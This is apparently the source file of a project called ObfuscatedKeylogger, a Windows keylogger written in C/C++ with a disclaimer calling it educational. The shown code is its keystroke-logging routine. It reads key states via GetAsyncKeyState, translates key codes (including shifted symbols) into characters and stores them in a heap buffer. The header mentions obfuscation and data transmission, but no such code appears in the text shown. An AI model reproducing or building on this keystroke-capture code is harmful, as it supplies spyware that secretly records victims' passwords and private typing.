/*
 * ObfuscatedKeylogger.cpp
 * Author: Alex Zevnoski (Leshenka)
 * Copyright (c) 2024 Alex Zevnoski (Leshenka)
 *
 * This file is part of the ObfuscatedKeylogger project, an educational
 * and experimental project demonstrating obfuscation and data transmission techniques.
 *
 * DISCLAIMER: This software is intended solely for educational purposes.
 * The author does not condone or support illegal or unethical use of this software.
 */

#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    char* baseAddress;
    size_t size;
    size_t used;
} MemoryRegion;


int logKey(int _key, MemoryRegion* memRegion) {
    char output[2]; // Buffer to store a single character
    output[1] = '\0'; // Null-terminate the string

    if ((_key >= 0x30 && _key <= 0x39) || // Numbers
        (_key >= 0x41 && _key <= 0x5A)) { // Letters
        // Check if Shift key is pressed
        bool isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

        if (_key >= 0x30 && _key <= 0x39) { // Numbers
            if (isShiftPressed) {
                // Map numbers to their shifted counterparts
                const char shiftedNumbers[] = ")!@#$%^&*(";
                output[0] = shiftedNumbers[_key - 0x30];
            } else {
                output[0] = (char)_key;
            }
        } else { // Letters
            output[0] = isShiftPressed ? (char)_key : (char)(_key + 32); // Adjust for lowercase if no Shift
        }
    } else {
        // Handle special keys
        switch (_key) {
            case VK_SPACE:
                output[0] = ' ';
                break;
            case VK_RETURN:
                output[0] = '\n';
                break;
            case VK_TAB:
                output[0] = '\t';
                break;
            case VK_DELETE:
                output[0] = '\b'; // Use backspace representation for simplicity
                break;
            default:
                return 0; // Ignore unmapped keys
        }
    }

    // Null-terminate the string
    output[1] = '\0';

    size_t outputLen = strlen(output);

    // Check if there's enough space in the memory region
    if (memRegion->used + outputLen + 1 > memRegion->size) {
        size_t newSize = memRegion->size * 2;
        char* newBase = (char*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, memRegion->baseAddress, newSize);
        if (newBase == NULL) {
            perror("Memory reallocation failed");
            return 1;
        }
        memRegion->baseAddress = newBase;
        memRegion->size = newSize;
    }

    // Append the character to the memory region
    memcpy(memRegion->baseAddress + memRegion->used, output, outputLen);
    memRegion->used += outputLen;

    // Add a null terminator
    memRegion->baseAddress[memRegion->used] = '\0';

    return 0;
}